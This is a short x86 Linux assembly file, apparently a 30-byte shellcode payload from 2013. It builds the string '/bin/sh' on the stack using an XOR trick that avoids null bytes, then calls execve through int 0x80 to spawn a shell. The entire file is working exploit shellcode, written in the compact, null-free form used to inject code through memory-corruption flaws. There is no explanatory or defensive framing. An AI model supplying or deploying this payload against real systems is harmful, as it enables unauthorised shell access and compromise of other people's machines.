#
# Copyright 2013 Joseph Landry
#

# 30 bytes
.section .text
.global _start

_start:
	mov $0x0068732f ^ 0xFFFFFFFF, %eax
	xor $0xFFFFFFFF, %eax
	push %eax
	push $0x6e69622f
	mov %esp, %esi
	xor %eax, %eax
	pushl %eax
	movl %esp, %edx # char *envp[]
	pushl %esi
	movl %esp, %ecx # char *argv[]
	movb $0xb, %al # sys_execve()
	movl %esi, %ebx # char *filename
	int $0x80
